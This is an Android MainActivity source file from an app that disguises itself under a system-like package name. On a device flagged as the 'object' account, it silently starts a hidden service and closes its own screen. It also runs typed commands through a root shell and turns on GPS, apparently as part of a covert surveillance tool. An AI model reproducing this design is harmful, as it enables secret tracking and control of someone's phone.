package android.service.app;

import android.annotation.TargetApi;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.service.app.db.data.impl.Account;
import android.service.app.gps.GpsService;
import android.service.app.ui.SettingsActivity;
import android.service.app.utils.AndroidUtils;
import android.service.app.utils.CommandUtils;
import android.service.app.utils.Log;
import android.support.annotation.NonNull;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.stericson.RootShell.execution.Command;
import com.stericson.RootShell.execution.Shell;
import com.stericson.RootTools.RootTools;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.prefs.Preferences;

public class MainActivity extends Activity
{
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);

        boolean isObjectAccount = AndroidUtils.isObjectAccount(getApplicationContext());
        Log.info("isObjectAccount=" + isObjectAccount);
        if (isObjectAccount)
        {
            startService(new Intent(this, Service.class));
            finish();
        }

        setContentView(R.layout.activity_main);
        registerReceiver(uiUpdated, new IntentFilter("EVENT_UPDATED"));

        Button mButton = (Button) findViewById(R.id.button);
        final EditText mEdit = (EditText) findViewById(R.id.editText);

        mButton.setOnClickListener(
                new View.OnClickListener()
                {
                    public void onClick(View view)
                    {
                        final String commandString = mEdit.getText().toString();
                        //boolean isSmsCommand = String.valueOf(commandString).toLowerCase().contains(SMS.toLowerCase());
                        CommandUtils.setWrapper(getApplication());
                        CommandUtils.executeCommand(CommandUtils.buildCommand(commandString.replaceAll("\n", "") + "\n"), true);
                    }
                });

        turnOnGpsIfNeeded();
    }

    private void turnOnGpsIfNeeded()
    {
        GpsService gpsService;
        try
        {
            gpsService = new GpsService(this);
            if(!gpsService.canGetLocation()) gpsService.showSettingsAlert();
        } catch (Exception e)
        {
            AndroidUtils.handleExceptionWithoutThrow(e);
        }
    }

    @Override
    protected void onDestroy()
    {
        unregisterReceiver(uiUpdated);

        super.onDestroy();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu)
    {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    private BroadcastReceiver uiUpdated = new BroadcastReceiver()
    {

        @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
        @Override
        public void onReceive(Context context, Intent intent)
        {

            Bundle extras = intent.getExtras();
            String value = extras.getString("<Key>");

            TextView t = (TextView) findViewById(R.id.textView);

            CharSequence text = t.getText();
            String newMessage = "\n" + value;

            if (isTooLarge(t, text + newMessage))
            {
                t.clearComposingText();
                t.setText(newMessage);
            }
            else
                t.setText(text + newMessage);
        }
    };

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    private boolean isTooLarge (TextView text, String newText) {
        float textWidth = text.getPaint().measureText(newText);
        int measuredWidth = text.getMeasuredWidth();
        return (textWidth / measuredWidth > 4);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item)
    {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings)
        {
            Intent settingsActivity = new Intent(getBaseContext(),
                    SettingsActivity.class);
            settingsActivity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(settingsActivity);

            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
